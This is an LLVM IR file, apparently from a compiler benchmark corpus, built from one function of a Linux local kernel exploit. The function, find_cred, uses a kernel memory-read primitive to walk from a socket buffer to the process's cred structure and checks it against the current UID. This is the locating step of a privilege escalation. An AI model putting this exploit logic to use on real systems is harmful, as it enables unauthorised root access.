; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45010.c_find_cred.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45010.c_find_cred.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [16 x i8] c"skbuff => %llx\0A\00", align 1
@.str.1 = private unnamed_addr constant [31 x i8] c"Leaking sock struct from %llx\0A\00", align 1
@PHYS_OFFSET = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [43 x i8] c"Failed to find Sock address from sk_buff.\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"Sock->sk_rcvtimeo at offset %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [24 x i8] c"Cred structure at %llx\0A\00", align 1
@.str.5 = private unnamed_addr constant [54 x i8] c"UID from cred structure: %d, matches the current: %d\0A\00", align 1
@.str.6 = private unnamed_addr constant [29 x i8] c"failed to find sk_rcvtimeo.\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i64 ()* @find_cred to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i64 @find_cred() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = call i64 (...) @getuid()
  store i64 %8, i64* %2, align 8
  %9 = call i64 (...) @get_skbuff()
  store i64 %9, i64* %3, align 8
  %10 = load i64, i64* %3, align 8
  %11 = add i64 %10, 24
  %12 = call i32 @read64(i64 %11)
  %13 = sext i32 %12 to i64
  store i64 %13, i64* %4, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i32 (i8*, i64, ...) @msg(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0), i64 %14)
  %16 = load i64, i64* %4, align 8
  %17 = call i32 (i8*, i64, ...) @msg(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.1, i64 0, i64 0), i64 %16)
  %18 = load i64, i64* %4, align 8
  %19 = load i64, i64* @PHYS_OFFSET, align 8
  %20 = icmp ult i64 %18, %19
  br i1 %20, label %21, label %23

21:                                               ; preds = %0
  %22 = call i32 @fail(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0))
  br label %23

23:                                               ; preds = %21, %0
  store i32 0, i32* %5, align 4
  br label %24

24:                                               ; preds = %62, %23
  %25 = load i32, i32* %5, align 4
  %26 = icmp slt i32 %25, 100
  br i1 %26, label %27, label %67

27:                                               ; preds = %24
  %28 = load i64, i64* %4, align 8
  %29 = call i32 @read64(i64 %28)
  %30 = sext i32 %29 to i64
  %31 = icmp eq i64 %30, 9223372036854775807
  br i1 %31, label %32, label %61

32:                                               ; preds = %27
  %33 = load i64, i64* %4, align 8
  %34 = sub i64 %33, 8
  %35 = call i32 @read64(i64 %34)
  %36 = sext i32 %35 to i64
  store i64 %36, i64* %6, align 8
  %37 = load i64, i64* %6, align 8
  %38 = load i64, i64* @PHYS_OFFSET, align 8
  %39 = icmp ult i64 %37, %38
  br i1 %39, label %40, label %41

40:                                               ; preds = %32
  br label %62

41:                                               ; preds = %32
  %42 = load i64, i64* %6, align 8
  %43 = add i64 %42, 8
  %44 = call i32 @read64(i64 %43)
  %45 = zext i32 %44 to i64
  store i64 %45, i64* %7, align 8
  %46 = load i64, i64* %7, align 8
  %47 = load i64, i64* %2, align 8
  %48 = icmp ne i64 %46, %47
  br i1 %48, label %49, label %50

49:                                               ; preds = %41
  br label %62

50:                                               ; preds = %41
  %51 = load i32, i32* %5, align 4
  %52 = mul nsw i32 %51, 8
  %53 = sext i32 %52 to i64
  %54 = call i32 (i8*, i64, ...) @msg(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0), i64 %53)
  %55 = load i64, i64* %6, align 8
  %56 = call i32 (i8*, i64, ...) @msg(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0), i64 %55)
  %57 = load i64, i64* %7, align 8
  %58 = load i64, i64* %2, align 8
  %59 = call i32 (i8*, i64, ...) @msg(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.5, i64 0, i64 0), i64 %57, i64 %58)
  %60 = load i64, i64* %6, align 8
  store i64 %60, i64* %1, align 8
  br label %69

61:                                               ; preds = %27
  br label %62

62:                                               ; preds = %61, %49, %40
  %63 = load i32, i32* %5, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %5, align 4
  %65 = load i64, i64* %4, align 8
  %66 = add i64 %65, 8
  store i64 %66, i64* %4, align 8
  br label %24

67:                                               ; preds = %24
  %68 = call i32 @fail(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.6, i64 0, i64 0))
  br label %69

69:                                               ; preds = %67, %50
  %70 = load i64, i64* %1, align 8
  ret i64 %70
}

declare dso_local i64 @getuid(...) #1

declare dso_local i64 @get_skbuff(...) #1

declare dso_local i32 @read64(i64) #1

declare dso_local i32 @msg(i8*, i64, ...) #1

declare dso_local i32 @fail(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
